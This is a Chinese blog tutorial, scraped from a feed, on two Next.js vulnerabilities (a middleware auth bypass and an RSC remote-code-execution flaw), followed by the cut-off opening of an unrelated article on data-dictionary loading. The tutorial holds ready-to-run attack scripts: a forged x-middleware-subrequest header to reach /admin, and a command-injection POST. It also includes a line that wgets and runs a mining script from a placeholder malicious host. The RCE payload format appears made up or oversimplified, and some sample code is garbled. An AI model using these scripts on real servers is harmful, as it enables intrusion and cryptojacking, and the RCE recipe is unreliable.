#ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Next.js 近期高危漏洞完整指南：原理 + 攻击示例（前端易懂版）</h2>
<h3 data-id="heading-1">一、漏洞核心信息速览（前端必知）</h3>
<h4 data-id="heading-2">1. 事件背景（时间 + 起因）</h4>
<ul>
<li>
<p><strong>CVE-2025-29927（身份验证绕过）</strong>：2025 年 3 月公开，实际隐藏 4 年！影响 Next.js 11.1.4 ~ 15.2.2 版本，起因是中间件对 <code>x-middleware-subrequest</code> 请求头校验太宽松，外部可伪造。</p>
</li>
<li>
<p><strong>CVE-2025-66478（远程代码执行 RCE）</strong>：2025 年 12 月 4 日披露，CVSS 10.0（最高危），影响 Next.js 15/16 及部分 14.x 测试版，源于 React Server Components（RSC）协议的反序列化漏洞，服务器会执行恶意请求里的命令。</p>
</li>
</ul>
<h4 data-id="heading-3">2. 漏洞原理（通俗解释）</h4>
<ul>
<li>
<p>绕过漏洞：Next.js 中间件把 <code>x-middleware-subrequest</code> 当作 “内部请求标识”，但没验证是否真的是内部发的，攻击者拼几个合法值就能骗中间件放行。</p>
</li>
<li>
<p>RCE 漏洞：App Router 用 RSC 协议传输组件数据，服务器接收数据时没校验，直接执行里面的命令，相当于给攻击者开了 “服务器操作权限”。</p>
</li>
</ul>
<h4 data-id="heading-4">3. 核心危害（前端能感知的影响）</h4>
<ul>
<li>
<p>绕过漏洞：别人不用登录就能进后台（如 <code>/admin</code>），偷敏感数据、篡改内容。</p>
</li>
<li>
<p>RCE 漏洞：最致命！攻击者能操控服务器，偷数据库密码、植入挖矿程序（让服务器变 “肉鸡”）、删除业务数据，甚至瘫痪服务。</p>
</li>
</ul>
<h4 data-id="heading-5">4. 快速预防方案（前端直接能用）</h4>
<ol>
<li>
<p>优先升级：按版本对应升级（15.x→≥15.3.6；14.x→≥14.2.25；13.x→≥13.5.9）。</p>
</li>
<li>
<p>临时防护：用 Nginx/Cloudflare 拦截 <code>x-middleware-subrequest</code> 请求头（禁止外部提交）。</p>
</li>
<li>
<p>代码层面：关键路由（如登录、支付）不要只靠中间件校验，加二次验证（如接口层查 token 有效性）。</p>
</li>
</ol>
<h4 data-id="heading-6">5. 涉及核心知识点（前端关联技能）</h4>
<ul>
<li>
<p>Next.js 中间件：运行在请求最前面的校验逻辑，不是前端代码，是服务端轻量函数。</p>
</li>
<li>
<p>RSC（React Server Components）：App Router 核心，服务端渲染组件的协议，数据传输要校验。</p>
</li>
<li>
<p>请求伪造：客户端可篡改请求头 / 请求体，服务端不能 “无条件信任”。</p>
</li>
<li>
<p>依赖安全：框架底层漏洞只能靠升级修复，定期用 <code>npm audit</code> 查漏洞。</p>
</li>
</ul>
<hr/>
<h3 data-id="heading-7">二、攻击代码示例（仅用于学习，严禁非法使用）</h3>
<blockquote>
<p>⚠️ 注意事项：</p>
</blockquote>
<ol>
<li>
<p>以下代码仅用于 <strong>漏洞原理学习</strong>，严禁用于攻击真实网站，否则需承担法律责任！</p>
</li>
<li>
<p>测试仅允许在自己搭建的漏洞环境（如本地部署受影响版本的 Next.js 项目）中进行。</p>
</li>
<li>
<p>演示脚本聚焦 “攻击核心逻辑”，省略了真实攻击中的扫描、持久化等步骤，突出 “如何触发漏洞”。</p>
</li>
</ol>
<h4 data-id="heading-8">（一）CVE-2025-29927（身份验证绕过漏洞）攻击示例</h4>
<h5 data-id="heading-9">漏洞核心</h5>
<p>伪造 <code>x-middleware-subrequest</code> 请求头，绕过中间件的登录校验，直接访问受保护路由（如 <code>/admin</code>）。</p>
<h5 data-id="heading-10">攻击脚本：<code>bypass-auth.js</code></h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 需先执行：npm install axios</span>

<span class="hljs-keyword">const</span> axios = <span class="hljs-built_in">require</span>(<span class="hljs-string">'axios'</span>);

<span class="hljs-comment">// 目标地址（自己搭建的测试项目）</span>

<span class="hljs-keyword">const</span> targetUrl = <span class="hljs-string">'http://localhost:3000/admin'</span>;

<span class="hljs-comment">// 核心：伪造请求头，触发中间件绕过</span>

<span class="hljs-keyword">const</span> attackConfig = {

   <span class="hljs-attr">headers</span>: {

     <span class="hljs-comment">// 关键：拼接 5 次合法标识，触发新版本漏洞绕过</span>

     <span class="hljs-string">'x-middleware-subrequest'</span>: <span class="hljs-string">'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware'</span>,

     <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'</span> <span class="hljs-comment">// 伪装浏览器</span>

   }

};

<span class="hljs-comment">// 发送攻击请求</span>

axios.<span class="hljs-title function_">get</span>(targetUrl, attackConfig)

   .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> {

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'攻击结果：'</span>);

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'状态码：'</span>, response.<span class="hljs-property">status</span>);

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'响应内容（前500字符）：'</span>, response.<span class="hljs-property">data</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">500</span>));

     <span class="hljs-keyword">if</span> (response.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) {

       <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'✅ 身份验证绕过成功！已访问受保护的 /admin 路由'</span>);

     }

   })

   .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> {

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'攻击失败：'</span>, error.<span class="hljs-property">message</span>);

   });
</code></pre>
<h5 data-id="heading-11">测试环境搭建（本地复现用）</h5>
<ol>
<li>新建受影响版本的 Next.js 项目（如 15.2.2）：</li>
</ol>
<pre><code class="hljs language-lua" lang="lua">npx <span class="hljs-built_in">create</span>-<span class="hljs-built_in">next</span>-app@<span class="hljs-number">15.2</span><span class="hljs-number">.2</span> test-vuln-project

cd test-vuln-project
</code></pre>
<ol>
<li>创建中间件 <code>src/middleware.js</code>（模拟登录校验）：</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">NextResponse</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'next/server'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params">req</span>) {

   <span class="hljs-comment">// 简单校验：没有登录 cookie 就拦截跳转到登录页</span>

   <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">cookies</span>.<span class="hljs-property">token</span>) {

     <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">redirect</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'/login'</span>, req.<span class="hljs-property">url</span>));

   }

   <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();

}

<span class="hljs-comment">// 仅对 /admin 路由生效</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> config = { <span class="hljs-attr">matcher</span>: <span class="hljs-string">'/admin'</span> };
</code></pre>
<ol>
<li>创建 <code>/admin</code> 页面 <code>app/admin/page.js</code>：</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">AdminPage</span>(<span class="hljs-params"/>) {

   <span class="hljs-keyword">return</span> 后台（仅登录可见）\&lt;/h1&gt;;

}
</code></pre>
<h5 data-id="heading-12">运行步骤</h5>
<ol>
<li>
<p>启动测试项目：<code>npm run dev</code></p>
</li>
<li>
<p>运行攻击脚本：<code>node bypass-auth.js</code></p>
</li>
<li>
<p>预期结果：无需登录 cookie，控制台输出 200 状态码和 admin 页面内容，绕过成功。</p>
</li>
</ol>
<hr/>
<h4 data-id="heading-13">（二）CVE-2025-66478（RSC 远程代码执行漏洞）攻击示例</h4>
<h5 data-id="heading-14">漏洞核心</h5>
<p>构造符合 RSC 协议格式的 POST 请求体，注入系统命令（如 <code>whoami</code>），服务器会直接执行该命令。</p>
<h5 data-id="heading-15">攻击脚本：<code>rce-attack.js</code></h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 需先执行：npm install axios</span>

<span class="hljs-keyword">const</span> axios = <span class="hljs-built_in">require</span>(<span class="hljs-string">'axios'</span>);

<span class="hljs-comment">// 目标地址（启用 App Router 的受影响版本项目）</span>

<span class="hljs-keyword">const</span> targetUrl = <span class="hljs-string">'http://localhost:3000'</span>;

<span class="hljs-comment">// 核心：构造 RSC 协议的恶意请求体，注入系统命令</span>

<span class="hljs-keyword">const</span> maliciousBody = {

   <span class="hljs-comment">// RSC 协议固定格式字段（简化版，模拟合法请求）</span>

   <span class="hljs-attr">id</span>: <span class="hljs-string">'123'</span>,

   <span class="hljs-attr">chunks</span>: \[

     <span class="hljs-comment">// 注入恶意命令：Windows 用 "whoami"，Linux/Mac 用 "id"</span>

     <span class="hljs-string">'{"type":"invoke","args":\[";whoami;"]}'</span>

   ],

   <span class="hljs-attr">version</span>: <span class="hljs-string">'0.1'</span>,

   <span class="hljs-attr">mode</span>: <span class="hljs-string">'server-component'</span>

};

<span class="hljs-comment">// 发送攻击请求（RSC 漏洞通过 POST / 触发）</span>

axios.<span class="hljs-title function_">post</span>(targetUrl, maliciousBody, {

   <span class="hljs-attr">headers</span>: {

     <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>,

     <span class="hljs-string">'Accept'</span>: <span class="hljs-string">'text/x-component'</span> <span class="hljs-comment">// RSC 协议要求的 Accept 头</span>

   }

})

   .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> {

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'攻击结果：'</span>);

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'状态码：'</span>, response.<span class="hljs-property">status</span>);

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'响应内容：'</span>, response.<span class="hljs-property">data</span>);

     <span class="hljs-comment">// 校验命令执行结果（包含路径分隔符即为成功）</span>

     <span class="hljs-keyword">if</span> (response.<span class="hljs-property">data</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'/'</span>) || response.<span class="hljs-property">data</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'\\\\'</span>)) {

       <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'✅ 远程代码执行成功！已获取服务器用户信息'</span>);

     }

   })

   .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> {

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'攻击失败：'</span>, error.<span class="hljs-property">response</span>?.<span class="hljs-property">data</span> || error.<span class="hljs-property">message</span>);

   });
</code></pre>
<h5 data-id="heading-16">测试环境搭建（本地复现用）</h5>
<ol>
<li>新建受影响版本的 Next.js 项目（如 15.3.3）：</li>
</ol>
<pre><code class="hljs language-lua" lang="lua">npx <span class="hljs-built_in">create</span>-<span class="hljs-built_in">next</span>-app@<span class="hljs-number">15.3</span><span class="hljs-number">.3</span> test-rce-project

cd test-rce-project
</code></pre>
<ol>
<li>启用 App Router（默认已启用，确保 <code>app/page.js</code> 存在）：</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// app/page.js</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Home</span>(<span class="hljs-params"/>) {

   <span class="hljs-keyword">return</span> &gt;<span class="hljs-title class_">Next</span>.<span class="hljs-property">js</span> <span class="hljs-title class_">App</span> <span class="hljs-title class_">Router</span> 测试页;

}
</code></pre>
<h5 data-id="heading-17">运行步骤</h5>
<ol>
<li>
<p>启动测试项目：<code>npm run dev</code></p>
</li>
<li>
<p>运行攻击脚本：<code>node rce-attack.js</code></p>
</li>
<li>
<p>预期结果：</p>
</li>
</ol>
<ul>
<li>
<p>Windows 系统：响应中返回 <code>DESKTOP-XXX\用户名</code></p>
</li>
<li>
<p>Linux/Mac 系统：响应中返回 <code>www-data</code> 或当前用户身份</p>
</li>
<li>
<p>控制台输出 “远程代码执行成功”</p>
</li>
</ul>
<blockquote>
<p>📌 注：真实攻击中，攻击者会将</p>
<p><code>whoami</code></p>
<p>替换为恶意命令，例如：</p>
</blockquote>
<pre><code class="hljs language-json" lang="json">'<span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"invoke"</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span>\<span class="hljs-punctuation">[</span><span class="hljs-string">";wget http://恶意地址/挖矿脚本.sh &amp;&amp; chmod +x 挖矿脚本.sh &amp;&amp; ./挖矿脚本.sh;"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">}</span>'
</code></pre>
<p>本示例仅用 <code>whoami</code> 演示原理，切勿用于非法用途。</p>
<hr/>
<h3 data-id="heading-18">三、前端关键提醒</h3>
<ol>
<li>
<p><strong>漏洞本质</strong>：都是 “信任了客户端输入”—— 中间件信了伪造的请求头，服务器信了伪造的 RSC 数据，核心是 “服务端未做严格校验”。</p>
</li>
<li>
<p><strong>修复原则</strong>：框架底层漏洞，前端代码无法直接防御！必须升级 Next.js 到安全版本（这是最根本、最靠谱的方案）。</p>
</li>
<li>
<p><strong>额外防护</strong>：</p>
</li>
</ol>
<ul>
<li>
<p>关键路由（登录、支付、后台）必须加 “双重校验”（中间件 + 接口层 token 验证），不要单靠中间件。</p>
</li>
<li>
<p>自托管项目需在 Nginx/Cloudflare 层拦截恶意请求头（如 <code>x-middleware-subrequest</code>）。</p>
</li>
</ul>
<ol>
<li><strong>日常习惯</strong>：</li>
</ol>
<ul>
<li>
<p>定期执行 <code>npm audit</code> 扫描依赖漏洞，及时更新补丁版本。</p>
</li>
<li>
<p>关键业务优先使用 Vercel 托管（官方自带漏洞防护，自动屏蔽部分攻击）。</p>
</li>
<li>
<p>服务器启用主机安全工具，监控异常进程和文件下载。</p>
</li>
</ul>
<blockquote>
<p>最后感谢阅读！欢迎关注我，微信公众号：<code>《鲫小鱼不正经》</code>。欢迎点赞、收藏、关注，一键三连！！！</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端数据字典技术方案实战]]></title>    <link>https://juejin.cn/post/7581750253000425507</link>    <guid>https://juejin.cn/post/7581750253000425507</guid>    <pubDate>2025-12-10T02:24:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581750253000425507" data-draft-id="7581752787564052520" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端数据字典技术方案实战"/> <meta itemprop="keywords" content="前端,JavaScript,架构"/> <meta itemprop="datePublished" content="2025-12-10T02:24:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="树深遇鹿"/> <meta itemprop="url" content="https://juejin.cn/user/3281394147006381"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端数据字典技术方案实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3281394147006381/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    树深遇鹿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:24:05.000Z" title="Wed Dec 10 2025 02:24:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto;border:3px solid rgba(62,175,124,.2)}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-weight:700;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border-radius:6px;border:2px solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c}.markdown-body a:active,.markdown-body a:hover{border-bottom:1.5px solid #3eaf7c}.markdown-body a:before{content:"⇲"}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(62,175,124,.2)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:.5rem solid;border-color:#42b983;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none}.markdown-body ul li:before{content:"•";margin-right:4px;color:#3eaf7c}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>在后台与中台系统开发领域，数据字典是极为常见且至关重要的概念，相信大多数从事相关开发工作的朋友都对其耳熟能详。几乎每一个成熟的项目，都会专门设置一个字典模块，用于精心维护各类字典数据。这些字典数据在系统中扮演着举足轻重的角色，为下拉框、转义值、单选按钮等组件提供了不可或缺的基础数据支撑。</p>
<p>我自工作以来参与过很多个项目，既有从零开始搭建的，也有接手他人项目的。在实践过程中，我发现不同项目对字典的实现方式各不相同，且各有侧重。例如，对于项目中的字典基本不会发生变化的，项目通常会采用首次全部加载到本地缓存的方式。这种方式能显著节省网络请求次数，提升系统响应速度。然而，对于项目中的字典经常变动的，项目则会采用按需加载的方式，即哪里需要使用字典值，就在哪里进行加载。但这种方式也存在弊端，当某个页面需要使用十多个字典值时，首次进入页面会一次性发出十多个请求来获取这些字典值，影响用户体验。</p>
<h2 data-id="heading-1">常见字典方案剖析</h2>
<p>在当下，数据字典的实现方案丰富多样，各有优劣。下面将详细介绍几种常见的方案，并分析其特点。我将详细介绍几种常见的方案，并深入剖析其特点。这几种方案皆是我通过实践精心总结而来，其中方案四的思路是由<a href="https://juejin.cn/user/78820570050190" target="_blank" title="https://juejin.cn/user/78820570050190">我不爱吃鱼啦</a>提供。</p>
<h3 data-id="heading-2">方案一：首次全部加载到本地进行缓存</h3>
<h4 data-id="heading-3">方案描述</h4>
<p>系统启动或用户首次访问时，将所有字典数据一次性加载到本地缓存中。后续使用过程中，直接从缓存中获取所需字典数据，无需再次向服务器发起请求。</p>
<h4 data-id="heading-4">优点</h4>
<ul>
<li><strong>访问速度快</strong>：后续访问时直接从本地缓存读取数据，无需等待网络请求，响应速度极快。</li>
<li><strong>减少网络请求</strong>：一次性加载后，后续使用无需频繁发起网络请求，降低了网络开销。</li>
<li><strong>网络依赖小</strong>：即使在网络不稳定的情况下，也能正常使用已缓存的字典数据，保证了系统的稳定性。</li>
</ul>
<h4 data-id="heading-5">缺点</h4>
<ul>
<li><strong>首次加载时间长</strong>：若字典数据量较大，首次加载时可能需要较长时间，影响用户体验。</li>
<li><strong>占用存储空间</strong>：将所有字典数据存储在本地，会占用较多的本地存储空间，尤其是当字典数据量庞大时。</li>
<li><strong>缓存更新复杂</strong>：若字典数据频繁更新，需要设计复杂的缓存同步和更新机制，否则容易出现数据不一致的问题。</li>
</ul>
<h3 data-id="heading-6">方案二：按需加载不缓存</h3>
<h4 data-id="heading-7">方案描述</h4>
<p>当用户触发特定操作，需要使用字典数据时，才从后端实时加载所需数据，且不进行本地缓存。每次使用字典数据时，都重新从服务器获取最新数据。</p>
<h4 data-id="heading-8">优点</h4>
<ul>
<li><strong>节省存储空间</strong>：不进行本地缓存，节省了本地存储空间，尤其适用于存储资源有限的设备。</li>
<li><strong>数据实时性高</strong>：每次获取的数据都是最新的，不存在缓存数据与后端不一致的问题，保证了数据的准确性。</li>
</ul>
<h4 data-id="heading-9">缺点</h4>
<ul>
<li><strong>网络请求频繁</strong>：每次使用都需要发起网络请求，在网络状况不佳时，会导致加载时间变长，影响用户体验。</li>
<li><strong>增加服务器负担</strong>：频繁的网络请求会增加服务器的负担，尤其是在高并发场景下，可能影响服务器的性能。</li>
</ul>
<h3 data-id="heading-10">方案三：首次按需加载并缓存</h3>
<h4 data-id="heading-11">方案描述</h4>
<p>用户首次访问某个字典数据时，从后端加载该数据并缓存到本地。后续再次访问该字典数据时，直接从缓存中读取，无需再次向服务器发起请求。</p>
<h4 data-id="heading-12">优点</h4>
<ul>
<li><strong>减少网络请求</strong>：结合了前两种方案的部分优点，既在一定程度上减少了网络请求次数，又不会一次性加载过多数据。</li>
<li><strong>节省存储空间</strong>：相较于首次全部加载到本地缓存的方式，不会一次性占用大量本地存储空间，节省了部分存储资源。</li>
</ul>
<h4 data-id="heading-13">缺点</h4>
<ul>
